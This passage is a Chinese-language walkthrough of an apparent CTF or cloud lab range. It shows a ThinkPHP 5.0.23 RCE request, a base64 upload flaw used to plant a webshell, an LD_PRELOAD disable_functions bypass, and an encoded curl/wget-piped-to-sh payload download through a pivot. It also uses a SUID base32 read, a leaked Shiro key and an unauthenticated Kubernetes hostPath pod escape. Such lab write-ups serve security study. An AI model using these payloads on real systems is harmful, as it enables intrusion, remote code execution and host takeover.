# 信息收集


```bash
┌──(root㉿MJ)-[~/tools/frp]
└─# nmap --min-rate 10000 -p- 8.130.152.214
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 13:47 CST
Warning: 8.130.152.214 giving up on port because retransmission cap hit (10).
Nmap scan report for 8.130.152.214
Host is up (0.15s latency).
Not shown: 57617 closed tcp ports (reset), 7915 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 50.66 seconds
```
tcp开了两个web和一个ssh

```bash
┌──(root㉿MJ)-[~/tools/frp]
└─# nmap -sU --top-ports 20 8.130.152.214
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 13:48 CST
Nmap scan report for 8.130.152.214
Host is up (0.029s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   closed        isakmp
514/udp   open|filtered syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  open|filtered ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown

Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds
```
udp一如既往先不看

80端口没什么进展，目录扫描也没什么有用信息，8080端口同样但是有个404状态码，有些时候404的特征信息就可以暴露框架
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# dirsearch -u http://8.130.152.214:8080/

Target: http://8.130.152.214:8080/

[13:50:00] Starting:
[13:50:24] 404 -    7KB - /index.php/login/
[13:50:33] 200 -   24B  - /robots.txt
[13:50:35] 301 -  322B  - /static  ->  http://8.130.152.214:8080/static/
```
有用的只有这三个，在访问/index.php/login/时暴露了框架信息

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# curl http://8.130.152.214:8080/index.php/login/                     

<!DOCTYPE html>
<html>
<body>
    <div class="echo">
            </div>
        <div class="exception">

            <div class="info"><h1>页面错误！请稍后再试～</h1></div>

    </div>



    <div class="copyright">
        <a title="官方网站" href="http://www.thinkphp.cn">ThinkPHP</a>
        <span>V5.0.23</span>
        <span>{ 十年磨一剑-为API开发设计的高性能框架 }</span>
    </div>
    </body>
</html>
```
忽略样式信息可以看到架构是tp5.0.23
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# searchsploit ThinkPHP
--------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                             |  Path
--------------------------------------------------------------------------- ---------------------------------
ThinkPHP - Multiple PHP Injection RCEs (Metasploit)                        | linux/remote/48333.rb
ThinkPHP 2.0 - 'index.php' Cross-Site Scripting                            | php/webapps/33933.txt
ThinkPHP 5.0.23/5.1.31 - Remote Code Execution                             | php/webapps/45978.txt
ThinkPHP 5.X - Remote Command Execution                                    | php/webapps/46150.txt
--------------------------------------------------------------------------- ---------------------------------
```
漏洞库可以看到有rce但是他这个exp有问题

# Web

```bash
POST /index.php?s=captcha HTTP/1.1
Host: 8.130.152.214:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

curl下即可得到回显
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# curl http://8.130.152.214:8080/index.php?s=captcha -X POST -d '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id'

<body>
    <div class="echo">
        uid=33(www-data) gid=33(www-data) groups=33(www-data)
    </div>
        <div class="exception">

            <div class="info"><h1>页面错误！请稍后再试～</h1></div>

    </div>



    <div class="copyright">
        <a title="官方网站" href="http://www.thinkphp.cn">ThinkPHP</a>
        <span>V5.0.23</span>
        <span>{ 十年磨一剑-为API开发设计的高性能框架 }</span>
    </div>
    </body>
```

直接vshell上线即可，这里我用的云服务器打，不详细展示，有关vshell的可以自行搜索

### flag1

在根下可以拿到


# 内网横向(第一层)

```bash
www-data@portal:/$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:05:09:48 brd ff:ff:ff:ff:ff:ff
    inet 172.28.23.17/16 brd 172.28.255.255 scope global dynamic eth0
       valid_lft 1892158846sec preferred_lft 1892158846sec
    inet6 fe80::216:3eff:fe05:948/64 scope link
       valid_lft forever preferred_lft forever
```
有个内网段，传fscan扫描，这里严重怀疑云镜要坑沙砾了，后两位主机位www-data没有权限发icmp包，只能ping，太慢了，这里直接当24网段扫了，第一位主机位没存活

```bash
www-data@portal:/tmp$ ./fscan -h 172.28.23.17/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.28.23.33    is alive
(icmp) Target 172.28.23.17    is alive
(icmp) Target 172.28.23.26    is alive
[*] Icmp alive hosts len is: 3
172.28.23.26:22 open
172.28.23.17:22 open
172.28.23.33:22 open
172.28.23.26:21 open
172.28.23.33:8080 open
172.28.23.17:8080 open
172.28.23.26:80 open
172.28.23.17:80 open
[*] alive ports len is: 8
start vulscan

[+] ftp 172.28.23.26:21:anonymous
   [->]OASystem.zip
[+] PocScan http://172.28.23.17:8080 poc-yaml-thinkphp5023-method-rce poc1
[+] PocScan http://172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file
[+] PocScan http://172.28.23.33:8080 poc-yaml-springboot-env-unauth spring2
```
有效信息这些，梳理一下
```bash
172.28.23.26       
	ftp -> 匿名登录有web源码
	ssh 
	http(80) -> OA系统
172.28.23.33
	ssh
	http(8080) -> ERP -> spring headdump泄露，未授权访问

```

## 172.28.23.26

### ftp

下载源码审计在uploadbase64.php发现文件上传，可以把源码拉到本地，扫描器扫一下就出了

```bash
<?php
/**
 * Description: PhpStorm.
 * Author: yoby
 * DateTime: 2018/12/4 18:01
 * Email:logove@qq.com
 * Copyright Yoby版权所有
 */
$img = $_POST['imgbase64'];
if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $img, $result)) {
    $type = ".".$result[2];
    $path = "upload/" . date("Y-m-d") . "-" . uniqid() . $type;
}
$img =  base64_decode(str_replace($result[1], '', $img));
@file_put_contents($path, $img);
exit('{"src":"'.$path.'"}');
```

### web

先测试下
```bash
www-data@portal:/tmp/OAsystem$ echo test | base64
dGVzdAo=
www-data@portal:/tmp/OAsystem$ curl -X POST -d 'imgbase64=data:image/png;base64,dGVzdAo=' http://172.28.23.26
/uploadbase64.php
{"src":"upload/2025-12-18-69439d03999bd.png"}www-www-data@portal:/tmp/OAsystem$ curl http://172.28.23.26/upload/2025-12-18-69439d03999bd.png
test
```
没检测后缀传个eval马拿下信息，看看disable_function
```bash
curl 'http://172.28.23.26/upload/2025-12-18-69439f1adcb82.php' -X POST -d '1=phpinfo();' | grep disable_function
```

```php
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl</td><td class="v">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl
```

全禁完了，大概率**LD_PRELOAD**了，原理可以看[webshell绕过disable_functions | the0n3](https://the0n3.top/pages/disfunc/)

这个是内网，所以蚁剑走个外网主机的代理去内网访问即可
```bash
www-data@portal:/tmp/OAsystem$ ./socat TCP-LISTEN:10001,fork TCP:172.28.23.26:80 &
[1] 4300
```
绕过LD_PRELOAD后，蚁剑会在upload下生产.antproxy.php文件，

```php
<?php
function get_client_header(){
    $headers=array();
    foreach($_SERVER as $k=>$v){
        if(strpos($k,'HTTP_')===0){
            $k=strtolower(preg_replace('/^HTTP/', '', $k));
            $k=preg_replace_callback('/_\w/','header_callback',$k);
            $k=preg_replace('/^_/','',$k);
            $k=str_replace('_','-',$k);
            if($k=='Host') continue;
            $headers[]="$k:$v";
        }
    }
    return $headers;
}
function header_callback($str){
    return strtoupper($str[0]);
}
function parseHeader($sResponse){
    list($headerstr,$sResponse)=explode("

",$sResponse, 2);
    $ret=array($headerstr,$sResponse);
    if(preg_match('/^HTTP/1.1 d{3}/', $sResponse)){
        $ret=parseHeader($sResponse);
    }
    return $ret;
}

set_time_limit(120);
$headers=get_client_header();
$host = "127.0.0.1";
$port = 61212;
$errno = '';
$errstr = '';
$timeout = 30;
$url = "/2025-12-18-69439f1adcb82.php";

if (!empty($_SERVER['QUERY_STRING'])){
    $url .= "?".$_SERVER['QUERY_STRING'];
};

$fp = fsockopen($host, $port, $errno, $errstr, $timeout);
if(!$fp){
    return false;
}

$method = "GET";
$post_data = "";
if($_SERVER['REQUEST_METHOD']=='POST') {
    $method = "POST";
    $post_data = file_get_contents('php://input');
}

$out = $method." ".$url." HTTP/1.1\r\n";
$out .= "Host: ".$host.":".$port."\r\n";
if (!empty($_SERVER['CONTENT_TYPE'])) {
    $out .= "Content-Type: ".$_SERVER['CONTENT_TYPE']."\r\n";
}
$out .= "Content-length:".strlen($post_data)."\r\n";

$out .= implode("\r\n",$headers);
$out .= "\r\n\r\n";
$out .= "".$post_data;

fputs($fp, $out);

$response = '';
while($row=fread($fp, 4096)){
    $response .= $row;
}
fclose($fp);
$pos = strpos($response, "\r\n\r\n");
$response = substr($response, $pos+4);
echo $response;

```
其中重要的是`$url = "/2025-12-18-69439f1adcb82.php";`字段
他去web根下找这个php文件，包找不到的，所以改成upload下，不过改了之后仍然不行，也是很神奇，有点神奇

最终方法是在web根下传了个system的get马，antproxy指过去`$url = "/shell.php";`不过蚁剑还是连不上实在没明白，但是直接curl antproxy可以执行命令
```bash
www-data@portal:/tmp/OAsystem$ curl 'http://172.28.23.26/upload/.antproxy.php?cmd=ls'
Api
Classes
checklogin.php
db.php
db_oasystem.sql
download
fn.php
index.php
main.php
manage
nginx.htaccess
oa4.png
shell.php
sqlbackup
static
system
upfile.php
upload
upload.php
uploadbase64.php
uploadimage
usertab.php
ver.php
```

在外网主机做socat代理把10002端口流量转发到服务器上，上线vshell即可
```
www-data@portal:/tmp$ ./socat TCP4-LISTEN:10002,reuseaddr,fork TCP4:ip:port &
[2] 4514
www-data@portal:/tmp$ curl 'http://172.28.23.26/upload/.antproxy.php?cmd=echo+KGN1cmwgLWZzU0wgLW0xODAgaHR0cDovLzE3Mi4yOC4yMy4xNzoxMDAwMi9zbHR8fHdnZXQgLVQxODAgLXEgaHR0cDovLzE3Mi4yOC4yMy4xNzoxMDAwMi9zbHQpfHNo+|base64+-d|bash'
```

### flag2

根下需要root才能读flag2
```bash
www-data@ubuntu-oa:/tmp$ find / -perm -4000 2>/dev/null
/bin/fusermount
/bin/ping6
/bin/mount
/bin/su
/bin/ping
/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/staprun
/usr/bin/base32
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/s-nail/s-nail-privsep
```
可以看到有base32，读完解码即可


## 172.28.23.33/172.22.10.16

### web
同样走代理
heapdump拿下来，分析一手可以得到，shiro框架
```
CookieRememberMeManager(ShiroKey)
-------------
algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES
```


<img width="2548" height="1295" alt="Image" src="https://github.com/user-attachments/assets/0aad6aa1-7825-4994-8588-8eb303c7eab5" />

直接一把梭了，[SummerSec/ShiroAttack2: shiro反序列化漏洞综合利用,包含（回显执行命令/注入内存马）修复原版中NoCC的问题 https://github.com/j1anFen/shiro_attack](https://github.com/SummerSec/ShiroAttack2)

继续上线vshell

还开了个59696端口，同时发现新的内网段
```bash
ops01@ubuntu-erp:~$ file HashNote 
HashNote: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1a23e8dbc5918602e6a0994df9b044d92ba96c87, for GNU/Linux 3.2.0, stripped
ops01@ubuntu-erp:~$ ss -lnt
State            Recv-Q           Send-Q                      Local Address:Port                        Peer Address:Port           Process           
LISTEN           0                4096                        127.0.0.53%lo:53                               0.0.0.0:*                                
LISTEN           0                128                               0.0.0.0:22                               0.0.0.0:*                                
LISTEN           0                64                                0.0.0.0:59696                            0.0.0.0:*                                
LISTEN           0                100                                     *:8080                                   *:*    
```
很多方法没找到具体pid，不过大概也可以猜到就是这个elf了，交给队友拷打了，继续内网

### flag3

在root下

# 内网横向(第二层)

```bash
www-data@ubuntu-oa:/tmp$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:05:09:70 brd ff:ff:ff:ff:ff:ff
    inet 172.28.23.26/16 brd 172.28.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe05:970/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:05:08:f6 brd ff:ff:ff:ff:ff:ff
    inet 172.22.14.6/16 brd 172.22.255.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe05:8f6/64 scope link 
       valid_lft forever preferred_lft forever
       
ops01@ubuntu-erp:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:05:09:55 brd ff:ff:ff:ff:ff:ff
    inet 172.28.23.33/16 brd 172.28.255.255 scope global dynamic eth0
       valid_lft 1892152665sec preferred_lft 1892152665sec
    inet6 fe80::216:3eff:fe05:955/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:05:09:59 brd ff:ff:ff:ff:ff:ff
    inet 172.22.10.16/24 brd 172.22.10.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe05:959/64 scope link 
       valid_lft forever preferred_lft forever
```


```bash
ops01@ubuntu-erp:/tmp/test$ ./fscan -h 172.22.10.16/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.10.28    is alive
(icmp) Target 172.22.10.16    is alive
[*] Icmp alive hosts len is: 2
172.22.10.28:3306 open
172.22.10.28:80 open
172.22.10.28:22 open
[*] alive ports len is: 5
start vulscan
[*] WebTitle http://172.22.10.28       code:200 len:1975   title:DooTask



www-data@ubuntu-oa:/tmp/test$ ./fscan -h 172.22.14.6/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.14.37    is alive
(icmp) Target 172.22.14.46    is alive
(icmp) Target 172.22.14.6     is alive
[*] Icmp alive hosts len is: 3
172.22.14.46:80 open
172.22.14.46:22 open
172.22.14.37:22 open
172.22.14.37:10250 open
172.22.14.37:2379 open
[*] alive ports len is: 8
start vulscan
[*] WebTitle http://172.22.14.46       code:200 len:785    title:Harbor
[+] InfoScan http://172.22.14.46       [Harbor] 
[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None
[+] PocScan http://172.22.14.46/swagger.json poc-yaml-swagger-ui-unauth [{path swagger.json}]
```


有个主机**172.22.10.28**，开放ssh，mysql，web，还有两台**172.22.14.37**这台主机开放了22，10250端口和2379端口

10250端口是Kubelet 的默认监听端口，用于与 API Server 通信，管理节点和容器的状态。
2379端口是 etcd服务的默认Client API监听端口，主要用于 Kubernetes 等系统中组件与 etcd 进行数据交互。

这两个端口都强烈暗示37这台主机也开放了kubelet服务

**172.22.14.46**开放了22和80端口，80端口是harbor


## 172.22.14.37-k8s

对**172.22.14.37**进行全端口扫描
```bash
www-data@ubuntu-oa:/tmp/test$ ./fscan -h 172.22.14.37 -p 1-65535

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
172.22.14.37:22 open
172.22.14.37:2379 open
172.22.14.37:2380 open
172.22.14.37:6443 open
172.22.14.37:10251 open
172.22.14.37:10252 open
172.22.14.37:10256 open
172.22.14.37:10250 open
[*] alive ports len is: 8
start vulscan
[*] WebTitle http://172.22.14.37:10252 code:404 len:19     title:None
[*] WebTitle http://172.22.14.37:10251 code:404 len:19     title:None
[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None
[*] WebTitle http://172.22.14.37:10256 code:404 len:19     title:None
[*] WebTitle https://172.22.14.37:6443 code:200 len:4671   title:None
[+] PocScan https://172.22.14.37:6443 poc-yaml-go-pprof-leak 
[+] PocScan https://172.22.14.37:6443 poc-yaml-kubernetes-unauth 
```
poc扫描发现存在kubernets未授权

```bash
root@VM-8-5-ubuntu:/tmp/test# proxychains4 curl https://172.22.14.37:6443 -k
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:10002  ...  172.22.14.37:6443  ...  OK
{
  "paths": [
    "/api",
    "/api/v1",
    "/apis",
    "/apis/",
    "/apis/admissionregistration.k8s.io",
    "/apis/admissionregistration.k8s.io/v1",
    "/apis/admissionregistration.k8s.io/v1beta1",
    "/apis/apiextensions.k8s.io",
    "/apis/apiextensions.k8s.io/v1",
    "/apis/apiextensions.k8s.io/v1beta1",
    "/apis/apiregistration.k8s.io",
    "/apis/apiregistration.k8s.io/v1",
    "/apis/apiregistration.k8s.io/v1beta1",
    "/apis/apps",
    "/apis/apps/v1",
    "/apis/authentication.k8s.io",
    "/apis/authentication.k8s.io/v1",
    "/apis/authentication.k8s.io/v1beta1",
    "/apis/authorization.k8s.io",
    "/apis/authorization.k8s.io/v1",
    "/apis/authorization.k8s.io/v1beta1",
    "/apis/autoscaling",
    "/apis/autoscaling/v1",
    "/apis/autoscaling/v2beta1",
    "/apis/autoscaling/v2beta2",
    "/apis/batch",
    "/apis/batch/v1",
    "/apis/batch/v1beta1",
    "/apis/certificates.k8s.io",
    "/apis/certificates.k8s.io/v1beta1",
    "/apis/coordination.k8s.io",
    "/apis/coordination.k8s.io/v1",
    "/apis/coordination.k8s.io/v1beta1",
    "/apis/events.k8s.io",
    "/apis/events.k8s.io/v1beta1",
    "/apis/extensions",
    "/apis/extensions/v1beta1",
    "/apis/networking.k8s.io",
    "/apis/networking.k8s.io/v1",
    "/apis/networking.k8s.io/v1beta1",
    "/apis/node.k8s.io",
    "/apis/node.k8s.io/v1beta1",
    "/apis/policy",
    "/apis/policy/v1beta1",
    "/apis/rbac.authorization.k8s.io",
    "/apis/rbac.authorization.k8s.io/v1",
    "/apis/rbac.authorization.k8s.io/v1beta1",
    "/apis/scheduling.k8s.io",
    "/apis/scheduling.k8s.io/v1",
    "/apis/scheduling.k8s.io/v1beta1",
    "/apis/storage.k8s.io",
    "/apis/storage.k8s.io/v1",
    "/apis/storage.k8s.io/v1beta1",
    "/healthz",
    "/healthz/autoregister-completion",
    "/healthz/etcd",
    "/healthz/log",
    "/healthz/ping",
    "/healthz/poststarthook/apiservice-openapi-controller",
    "/healthz/poststarthook/apiservice-registration-controller",
    "/healthz/poststarthook/apiservice-status-available-controller",
    "/healthz/poststarthook/bootstrap-controller",
    "/healthz/poststarthook/ca-registration",
    "/healthz/poststarthook/crd-informer-synced",
    "/healthz/poststarthook/generic-apiserver-start-informers",
    "/healthz/poststarthook/kube-apiserver-autoregistration",
    "/healthz/poststarthook/rbac/bootstrap-roles",
    "/healthz/poststarthook/scheduling/bootstrap-system-priority-classes",
    "/healthz/poststarthook/start-apiextensions-controllers",
    "/healthz/poststarthook/start-apiextensions-informers",
    "/healthz/poststarthook/start-kube-aggregator-informers",
    "/healthz/poststarthook/start-kube-apiserver-admission-initializer",
    "/livez",
    "/livez/autoregister-completion",
    "/livez/etcd",
    "/livez/log",
    "/livez/ping",
    "/livez/poststarthook/apiservice-openapi-controller",
    "/livez/poststarthook/apiservice-registration-controller",
    "/livez/poststarthook/apiservice-status-available-controller",
    "/livez/poststarthook/bootstrap-controller",
    "/livez/poststarthook/ca-registration",
    "/livez/poststarthook/crd-informer-synced",
    "/livez/poststarthook/generic-apiserver-start-informers",
    "/livez/poststarthook/kube-apiserver-autoregistration",
    "/livez/poststarthook/rbac/bootstrap-roles",
    "/livez/poststarthook/scheduling/bootstrap-system-priority-classes",
    "/livez/poststarthook/start-apiextensions-controllers",
    "/livez/poststarthook/start-apiextensions-informers",
    "/livez/poststarthook/start-kube-aggregator-informers",
    "/livez/poststarthook/start-kube-apiserver-admission-initializer",
    "/logs",
    "/metrics",
    "/openapi/v2",
    "/readyz",
    "/readyz/autoregister-completion",
    "/readyz/etcd",
    "/readyz/log",
    "/readyz/ping",
    "/readyz/poststarthook/apiservice-openapi-controller",
    "/readyz/poststarthook/apiservice-registration-controller",
    "/readyz/poststarthook/apiservice-status-available-controller",
    "/readyz/poststarthook/bootstrap-controller",
    "/readyz/poststarthook/ca-registration",
    "/readyz/poststarthook/crd-informer-synced",
    "/readyz/poststarthook/generic-apiserver-start-informers",
    "/readyz/poststarthook/kube-apiserver-autoregistration",
    "/readyz/poststarthook/rbac/bootstrap-roles",
    "/readyz/poststarthook/scheduling/bootstrap-system-priority-classes",
    "/readyz/poststarthook/start-apiextensions-controllers",
    "/readyz/poststarthook/start-apiextensions-informers",
    "/readyz/poststarthook/start-kube-aggregator-informers",
    "/readyz/poststarthook/start-kube-apiserver-admission-initializer",
    "/readyz/shutdown",
    "/version"
  ]
}

```
我这里是用的vshell的隧道代理加proxychains4来访问，但是kubectl好像总在收到回应时候有错，所以把静态工具传到靶机上搞，直接去拿就行


```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

原本是只有一个的，第一个是我新加的，对k8s不是很了解参考的[春秋云境-GreatWall-先知社区](https://xz.aliyun.com/news/14423)
不过感觉就像是推了个docker过去了然后docker逃逸了
```bash
www-data@ubuntu-oa:/tmp/test$ ./kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods
Please enter Username: xiyi
Please enter Password: NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment                    1/1     Running   0          76m
nginx-deployment-58d48b746d-q4zh7   1/1     Running   2          279d

www-data@ubuntu-oa:/tmp/test$ ./kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ describe pod nginx-deployment-58d48b746d-q4zh7
Please enter Username: xiyi
Please enter Password: Name:             nginx-deployment-58d48b746d-q4zh7
Namespace:        default
Priority:         0
Service Account:  default
Node:             ubuntu-k8s/172.22.14.37
Start Time:       Mon, 17 Mar 2025 16:11:45 +0800
Labels:           app=nginx
                  pod-template-hash=58d48b746d
Annotations:      <none>
Status:           Running
IP:               10.244.0.14
IPs:
  IP:           10.244.0.14
Controlled By:  ReplicaSet/nginx-deployment-58d48b746d
Containers:
  nginx:
    Container ID:   docker://47907884f8491b05ed19d17b7d17c7ff74e26c96396080868377a98637362395
    Image:          nginx:1.8
    Image ID:       docker-pullable://nginx@sha256:c97ee70c4048fe79765f7c2ec0931957c2898f47400128f4f3640d0ae5d60d10
    Port:           <none>
    Host Port:      <none>
    State:          Running
      Started:      Sun, 21 Dec 2025 13:48:48 +0800
    Last State:     Terminated
      Reason:       Completed
      Exit Code:    0
      Started:      Mon, 17 Mar 2025 16:13:11 +0800
      Finished:     Sun, 21 Dec 2025 13:47:29 +0800
    Ready:          True
    Restart Count:  2
    Environment:    <none>
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-6d2pl (ro)
Conditions:
  Type              Status
  Initialized       True 
  Ready             True 
  ContainersReady   True 
  PodScheduled      True 
Volumes:
  default-token-6d2pl:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  default-token-6d2pl
    Optional:    false
QoS Class:       BestEffort
Node-Selectors:  <none>
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:          <none>
```

同样，用 `nginx:1.8` 镜像创建名为 nginx-deployment 的 pod，将宿主机的目录挂载到 /mnt 目录。新建 test.yaml 文件，内容如下：
```yaml

apiVersion: v1
kind: Pod
metadata:
  name: nginx-deployment
spec:
  containers:
  - image: nginx:1.8
    name: container
    volumeMounts:
    - mountPath: /mnt
      name: test
  volumes:
  - name: test
    hostPath:
      path: /
```

创建pod同时保险起见再看一下弄上没有
```bash

./kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f test.yaml

www-data@ubuntu-oa:/tmp/test$ ./kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods
Please enter Username: xiyi
Please enter Password: NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment                    1/1     Running   0          80m
nginx-deployment-58d48b746d-q4zh7   1/1     Running   2          279d
```

搞上了直接连接就行
```bash
www-data@ubuntu-oa:/tmp/test$ ./kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment -- /bin/bash
Please enter Username: xiyi
root@nginx-deployment:/# 
root@nginx-deployment:/# 
```

写个公钥很基础了，不演示了，flag在mysql的历史命令里

### flag4
```mysql
root@ubuntu-k8s:~# cat .mysql_history
_HiStOrY_V2_
show\040databases;
create\040database\040flaghaha;
use\040flaghaha
DROP\040TABLE\040IF\040EXISTS\040`f1ag`;
CREATE\040TABLE\040`flag06`\040(
`id`\040int\040DEFAULT\040NULL,
\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL
)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
CREATE\040TABLE\040`flag06`\040(\040`id`\040int\040DEFAULT\040NULL,\040\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL\040)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
show\040tables;
drop\040table\040flag06;
DROP\040TABLE\040IF\040EXISTS\040`f1ag`;
CREATE\040TABLE\040`flag04`\040(
